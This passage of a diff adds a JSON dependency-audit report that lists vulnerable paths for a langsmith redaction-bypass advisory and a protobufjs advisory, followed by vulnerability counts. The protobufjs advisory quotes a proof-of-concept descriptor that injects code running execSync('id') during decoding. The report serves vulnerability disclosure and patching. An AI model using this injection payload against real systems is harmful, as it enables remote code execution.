+            ". > @langchain/groq@1.2.0 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/langgraph@1.2.8 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/langgraph@1.2.8 > @langchain/langgraph-checkpoint@1.0.1 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/langgraph@1.2.8 > @langchain/langgraph-sdk@1.8.8 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/langgraph-cli@1.1.17 > @langchain/langgraph-api@1.1.17 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/langgraph-cli@1.1.17 > @langchain/langgraph-api@1.1.17 > @langchain/langgraph@1.2.8 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/langgraph-cli@1.1.17 > @langchain/langgraph-api@1.1.17 > @langchain/langgraph@1.2.8 > @langchain/langgraph-checkpoint@1.0.1 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/langgraph-cli@1.1.17 > @langchain/langgraph-api@1.1.17 > @langchain/langgraph@1.2.8 > @langchain/langgraph-sdk@1.8.8 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/langgraph-cli@1.1.17 > @langchain/langgraph-api@1.1.17 > @langchain/langgraph-checkpoint@1.0.1 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/langgraph-cli@1.1.17 > @langchain/langgraph-api@1.1.17 > langsmith@0.5.16",
+            ". > @langchain/langgraph-cli@1.1.17 > @langchain/langgraph-api@1.1.17 > @langchain/langgraph-sdk@1.8.8 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            ". > @langchain/openai@1.4.4 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/anthropic@1.3.26 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/community@1.1.27 > @langchain/classic@1.0.27 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/community@1.1.27 > @langchain/classic@1.0.27 > @langchain/openai@1.4.1 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/community@1.1.27 > @langchain/classic@1.0.27 > @langchain/textsplitters@1.0.1 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/community@1.1.27 > @langchain/classic@1.0.27 > langsmith@0.5.16",
+            "server > @langchain/community@1.1.27 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/community@1.1.27 > @langchain/openai@1.4.1 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/community@1.1.27 > langsmith@0.5.16",
+            "server > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/google-genai@2.1.26 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/groq@1.2.0 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/langgraph@1.2.8 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/langgraph@1.2.8 > @langchain/langgraph-checkpoint@1.0.1 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/langgraph@1.2.8 > @langchain/langgraph-sdk@1.8.8 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/langgraph-cli@1.1.17 > @langchain/langgraph-api@1.1.17 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/langgraph-cli@1.1.17 > @langchain/langgraph-api@1.1.17 > @langchain/langgraph@1.2.8 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/langgraph-cli@1.1.17 > @langchain/langgraph-api@1.1.17 > @langchain/langgraph@1.2.8 > @langchain/langgraph-checkpoint@1.0.1 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/langgraph-cli@1.1.17 > @langchain/langgraph-api@1.1.17 > @langchain/langgraph@1.2.8 > @langchain/langgraph-sdk@1.8.8 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/langgraph-cli@1.1.17 > @langchain/langgraph-api@1.1.17 > @langchain/langgraph-checkpoint@1.0.1 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/langgraph-cli@1.1.17 > @langchain/langgraph-api@1.1.17 > langsmith@0.5.16",
+            "server > @langchain/langgraph-cli@1.1.17 > @langchain/langgraph-api@1.1.17 > @langchain/langgraph-sdk@1.8.8 > @langchain/core@1.1.39 > langsmith@0.5.16",
+            "server > @langchain/openai@1.4.4 > @langchain/core@1.1.39 > langsmith@0.5.16"
+          ]
+        },
+        {
+          "version": "0.4.12",
+          "paths": [
+            ". > @langchain/langgraph-cli@1.1.17 > langsmith@0.4.12",
+            "server > @langchain/langgraph-cli@1.1.17 > langsmith@0.4.12"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/langchain-ai/langsmith-sdk/security/advisories/GHSA-rr7j-v2q5-chgv\n- https://github.com/advisories/GHSA-rr7j-v2q5-chgv",
+      "created": "2026-04-16T01:20:37.000Z",
+      "id": 1116670,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nThe LangSmith SDK's output redaction controls (hideOutputs in JS, hide_outputs in Python) do not apply to streaming token events. When an LLM run produces streaming output, each chunk is recorded as a new_token event containing the raw token value. These events bypass the redaction pipeline entirely — prepareRunCreateOrUpdateInputs (JS) and _hide_run_outputs (Python) only process the inputs and outputs fields on a run, never the events array. As a result, applications relying on output redaction to prevent sensitive LLM output from being stored in LangSmith will still leak the full streamed content via run events.\n\n## Details\n\n**Both JS and Python SDKs are affected.** The same pattern exists in both:\n\n- **JS SDK**: `traceable.ts:997-1003` and `traceable.ts:1044-1050`\n- **Python SDK**: `run_helpers.py:1924` and `run_helpers.py:1996`\n\nIn both SDKs, `new_token` events with raw `kwargs.token` values are added during streaming, and the redaction pipeline (`hideOutputs` in JS, `hide_outputs` in Python) only processes `inputs`/`outputs` — never `events`.",
+      "reported_by": null,
+      "title": "LangSmith SDK: Streaming token events bypass output redaction",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "langsmith",
+      "vulnerable_versions": "<=0.5.18",
+      "github_advisory_id": "GHSA-rr7j-v2q5-chgv",
+      "recommendation": "Upgrade to version 0.5.19 or later",
+      "patched_versions": ">=0.5.19",
+      "updated": "2026-04-16T01:20:38.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-200",
+        "CWE-359",
+        "CWE-532"
+      ],
+      "url": "https://github.com/advisories/GHSA-rr7j-v2q5-chgv"
+    },
+    "1116756": {
+      "findings": [
+        {
+          "version": "7.5.4",
+          "paths": [
+            ". > @ricky0123/vad-web@0.0.30 > onnxruntime-web@1.24.3 > protobufjs@7.5.4"
+          ]
+        },
+        {
+          "version": "6.11.4",
+          "paths": [
+            ". > @langchain/community@1.1.27 > @xenova/transformers@2.17.2 > onnxruntime-web@1.14.0 > onnx-proto@4.0.4 > protobufjs@6.11.4",
+            ". > @xenova/transformers@2.17.2 > onnxruntime-web@1.14.0 > onnx-proto@4.0.4 > protobufjs@6.11.4",
+            "server > @langchain/community@1.1.27 > @xenova/transformers@2.17.2 > onnxruntime-web@1.14.0 > onnx-proto@4.0.4 > protobufjs@6.11.4",
+            "server > @xenova/transformers@2.17.2 > onnxruntime-web@1.14.0 > onnx-proto@4.0.4 > protobufjs@6.11.4"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/protobufjs/protobuf.js/security/advisories/GHSA-xq3m-2v4x-88gg\n- https://github.com/advisories/GHSA-xq3m-2v4x-88gg",
+      "created": "2026-04-16T22:34:57.000Z",
+      "id": 1116756,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nprotobufjs compiles protobuf definitions into JS functions. Attackers can manipulate these definitions to execute arbitrary JS code.\n\n### Details\nAttackers can inject arbitrary code in the \"type\" fields of protobuf definitions, which will then execute during object decoding using that definition.\n\n### PoC\n```js\nconst protobuf = require('protobufjs');\nmaliciousDescriptor = JSON.parse(`{\"nested\":{\"User\":{\"fields\":{\"id\":{\"type\":\"int32\",\"id\":1},\"data\":{\"type\":\"Data(){console.log(process.mainModule.require('child_process').execSync('id').toString())};\\\\nfunction X\",\"id\":2}}},\"Data(){console.log(process.mainModule.require('child_process').execSync('id').toString())};\\\\nfunction X\":{\"fields\":{\"content\":{\"type\":\"string\",\"id\":1}}}}}`)\nconst root = protobuf.Root.fromJSON(maliciousDescriptor);\nconst UserType = root.lookupType(\"User\");\nconst userBytes = Buffer.from([0x08, 0x01, 0x12, 0x07, 0x0a, 0x05, 0x68, 0x65, 0x6c, 0x6c, 0x6f]);\ntry {\n    const user = UserType.decode(userBytes);\n} catch (e) {}\n```\n\n### Impact\nRemote code execution when attackers can control the protobuf definition files.",
+      "reported_by": null,
+      "title": "Arbitrary code execution in protobufjs",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "protobufjs",
+      "vulnerable_versions": "<7.5.5",
+      "github_advisory_id": "GHSA-xq3m-2v4x-88gg",
+      "recommendation": "Upgrade to version 7.5.5 or later",
+      "patched_versions": ">=7.5.5",
+      "updated": "2026-04-16T22:34:57.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-94"
+      ],
+      "url": "https://github.com/advisories/GHSA-xq3m-2v4x-88gg"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 0,
+      "moderate": 11,
+      "high": 4,
+      "critical": 2
+    },
+    "dependencies": 1698,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 1698
+  }
+}
